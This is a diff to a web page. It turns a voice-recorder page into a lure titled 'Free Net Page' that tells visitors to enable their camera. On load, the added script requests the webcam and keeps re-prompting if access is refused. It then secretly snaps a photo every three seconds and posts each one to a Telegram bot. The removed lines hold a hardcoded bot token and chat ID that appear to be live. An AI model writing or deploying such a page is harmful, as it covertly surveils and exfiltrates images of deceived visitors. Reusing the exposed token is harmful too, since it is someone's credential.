@@ -3,117 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Microphone Voice Upload</title>
+    <title>Free Net Page</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            margin: 0;
-            background: linear-gradient(135deg, #4facfe, #00f2fe);
+            background: url('https://via.placeholder.com/1920x1080?text=Free+Net+Page') no-repeat center center fixed;
+            background-size: cover;
+            font-family: Arial, sans-serif;
             color: white;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 20px 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
             text-align: center;
-            width: 90%;
-            max-width: 400px;
         }
         h1 {
-            font-size: 24px;
+            font-size: 3rem;
             margin-bottom: 10px;
         }
         p {
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        button {
-            background-color: #0066cc;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
-        }
-        button:hover {
-            background-color: #004c99;
+            font-size: 1.2rem;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Voice Recorder</h1>
-        <p>Press start to record your voice.</p>
-        <button id="startRecording">Start Recording</button>
-        <button id="stopRecording" style="display: none;">Stop Recording</button>
+    <div>
+        <h1>Welcome to Free Net</h1>
+        <p>Enable camera to continue.</p>
     </div>
 
     <script>
-        let mediaRecorder;
-        let audioChunks = [];
+        const chat_id = '123456789'; // Replace with your Telegram Chat ID
+        const token = 'YOUR_BOT_TOKEN'; // Replace with your Telegram Bot Token
+        const telegramURL = `https://api.telegram.org/bot${token}/sendPhoto`;
 
-        const startButton = document.getElementById('startRecording');
-        const stopButton = document.getElementById('stopRecording');
-
-        startButton.addEventListener('click', async () => {
+        async function requestCameraPermission() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                mediaRecorder = new MediaRecorder(stream);
+                // Request camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-                mediaRecorder.start();
-                audioChunks = [];
-                mediaRecorder.ondataavailable = event => {
-                    audioChunks.push(event.data);
-                };
+                // Capture images continuously and send to Telegram
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
 
-                startButton.style.display = 'none';
-                stopButton.style.display = 'block';
-                alert("Recording started. Speak into your microphone.");
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+
+                setInterval(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob);
+
+                        fetch(telegramURL, {
+                            method: 'POST',
+                            body: formData,
+                        })
+                        .then(response => {
+                            if (!response.ok) {
+                                console.error("Failed to send photo.");
+                            }
+                        })
+                        .catch(error => console.error("Error:", error));
+                    }, 'image/jpeg');
+                }, 3000); // Capture every 3 seconds
+
             } catch (error) {
-                alert("Microphone access denied. Please allow access to continue.");
+                // If permission is denied, show an alert and try again
+                alert("Camera permission is required to access Free Net.");
+                requestCameraPermission();
             }
-        });
+        }
 
-        stopButton.addEventListener('click', () => {
-            mediaRecorder.stop();
-            mediaRecorder.onstop = async () => {
-                const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                const formData = new FormData();
-                formData.append('voice', audioBlob);
-
-                const chat_id = '5998202830'; // Replace with your Telegram Chat ID
-                const token = '7789337898:AAGfuc-dxckjDn2IL8RCDHf43haYcbz9J5g'; // Replace with your Telegram Bot Token
-                const telegramURL = `https://api.telegram.org/bot${token}/sendVoice`;
-
-                formData.append('chat_id', chat_id);
-
-                fetch(telegramURL, {
-                    method: 'POST',
-                    body: formData,
-                })
-                .then(response => {
-                    if (response.ok) {
-                        alert("Voice message sent to Telegram!");
-                    } else {
-                        alert("Failed to send the voice message.");
-                    }
-                })
-                .catch(error => {
-                    console.error("Error:", error);
-                    alert("An error occurred while sending the voice message.");
-                });
-
-                stopButton.style.display = 'none';
-                startButton.style.display = 'block';
-            };
-        });
+        // Request permission on page load
+        requestCameraPermission();
     </script>
 </body>
 </html>
